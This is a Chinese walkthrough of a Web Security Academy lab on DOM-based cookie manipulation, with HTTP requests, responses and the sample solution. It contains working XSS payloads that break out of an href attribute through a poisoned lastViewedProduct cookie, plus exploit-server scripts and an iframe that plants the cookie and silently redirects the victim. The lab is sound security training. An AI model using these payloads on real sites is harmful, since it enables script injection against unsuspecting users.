# 实验室：基于 DOM 的 Cookie 操纵

本实验展示了基于 DOM 的客户端 Cookie 操纵。要解决本实验，请注入一个 Cookie，使其在另一个页面上触发 XSS 并调用 `print()` 函数。你需要使用漏洞利用服务器将受害者引导至正确的页面。


## 步骤

探测
- 查看商品详情页面
    ```http
    GET /product?productId=1 HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```html
        <script>
            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
        </script>
        ```

        - 访问商品详情页面后，JS 立即尝试将当前 URL 字符串拼接后设置为 cookie

- 携带设置的 cookie 再次访问商品详情页面
    ```http
    GET /product?productId=2 HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=tJUoyw0BVXLzBvrdOvXbWLJiomhoUeZe; lastViewedProduct=https://id.web-security-academy.net/product?productId=1
    ```

    - 响应
        ```html
        <a href='https://id.web-security-academy.net/product?productId=1'>
            Last viewed product
        </a>
        ```
        - 新增 a 元素，反射 cookie 内容到 href 属性值
        - 源 cookie lastViewedProduct 字段
        - 汇 a href 属性值

测试
- cookie 反射 XSS
    ```http
    GET /product?productId=2 HTTP/2
    Host: id.web-security-academy.net
    Cookie: session=tJUoyw0BVXLzBvrdOvXbWLJiomhoUeZe; lastViewedProduct=https://id.web-security-academy.net/product?productId=1&'%20onfocus=print()%20autofocus%20tabindex=1%20foo='bar
    ```

    - 响应
        ```html
        <a href='https://id.web-security-academy.net/product?productId=1&' onfocus=print() autofocus tabindex=1 foo='bar'>
            Last viewed product
        </a>
        ```
        - 结构正确，浏览器测试可执行 JS

- 提取设置当前载荷的普通 URL，并设置攻击者页面
    ```html
    <script>
        location = "https://id.web-security-academy.net/product?productId=1&'%20onfocus=print()%20autofocus%20tabindex=1%20foo='bar"
    </script>
    ```

    - 浏览器访问成功设置 cookie，在访问其他商品页面时触发 JS
    - 发送到受害者，无法通关

- 修改载荷为普通 JS
    ```html
    <script>
        location = "https://id.web-security-academy.net/product?productId=1&'><script>print()</script>"
    </script>
    ```

    - 仍未通关

- 查看题目描述
    > 你需要使用漏洞利用服务器将受害者引导至正确的页面。
    - 即，此处受害者并非模拟浏览文章，从而自动触发设置 cookie 的 JS 注入执行，而是需二次发送链接触发

- 设置另一个 URL 或再次发送相同 URL 到受害者
    ```html
    <script>
        location = "https://id.web-security-academy.net/product?productId=2"
    </script>
    ```
    - 访问相同页面仍反射 lastViewedProduct cookie 值

- 通关

## 示例解决方案

> 使用 iframe 触发两次访问

1. 注意首页使用了一个名为 `lastViewedProduct` 的客户端 Cookie，其值为用户上次访问的产品页面的 URL。
2. 进入漏洞利用服务器，将以下 `iframe` 添加到正文中，记得将 `YOUR-LAB-ID` 替换为你的实验室 ID：
   ```html
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"></iframe>
   ```
3. 存储漏洞利用并将其发送给受害者。

`iframe` 的原始来源与其中一个产品页面的 URL 相同，只是在末尾添加了一个 JavaScript 负载。当 `iframe` 首次加载时，浏览器会临时打开该恶意 URL，其内容随后被保存为 `lastViewedProduct` Cookie 的值。`onload` 事件处理器确保受害者会立即被重定向到首页，而不会察觉此次操作。当受害者的浏览器保存了被投毒的 Cookie 后，加载首页将触发负载执行。
